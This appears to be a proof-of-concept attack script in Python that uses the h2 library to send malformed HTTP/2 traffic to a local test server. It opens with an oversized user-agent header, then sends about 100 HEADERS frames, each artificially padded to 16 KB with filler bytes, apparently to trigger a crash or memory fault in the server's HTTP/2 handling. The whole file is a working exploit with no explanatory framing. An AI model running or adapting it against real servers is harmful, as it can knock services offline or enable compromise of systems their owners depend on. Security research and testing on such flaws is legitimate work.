import socket

import h2.connection

SERVER_NAME = '192.168.139.133'
SERVER_PORT = 8080

# generic socket and ssl configuration
socket.setdefaulttimeout(15)

# open a socket to the server and initiate TLS/SSL
s = socket.create_connection((SERVER_NAME, SERVER_PORT))
#s = ctx.wrap_socket(s, server_hostname=SERVER_NAME)

c = h2.connection.H2Connection()
c.initiate_connection()
s.sendall(c.data_to_send())

headers = [
    (':method', 'GET'),
    (':path', '/'),
    (':authority', SERVER_NAME),
    (':scheme', 'http'),
    ('user-agent', 'a'*3097)
]
c.send_headers(1, headers, end_stream=True)
first_header = c.data_to_send()
s.sendall(first_header)
for i in range(3, 200, 2):
    c.send_headers(i, headers, end_stream=True)
    second_header = c.data_to_send()
    snd_hdr_size = int.from_bytes(second_header[:3], 'big')
    extend_size = 1024*16-snd_hdr_size
    second_header = (snd_hdr_size + extend_size).to_bytes(3, 'big') + second_header[3:] + b'\xbe'*extend_size
    d = second_header
    s.sendall(d)

body = b''
response_stream_ended = False
while not response_stream_ended:
    # read raw data from the socket
    data = s.recv(65536 * 1024)
    if not data:
        break

    # feed raw data into h2, and process resulting events
    events = c.receive_data(data)
    for event in events:
        print(event)
        if isinstance(event, h2.events.DataReceived):
            # update flow control so the server doesn't starve us
            c.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
            # more response body data received
            body += event.data
        if isinstance(event, h2.events.StreamEnded):
            # response body completed, let's exit the loop
            response_stream_ended = True
            break
    # send any pending data to the server
    s.sendall(c.data_to_send())

print("Response fully received:")
#print(body.decode())

# tell the server we are closing the h2 connection
c.close_connection()
s.sendall(c.data_to_send())

# close the socket
s.close()
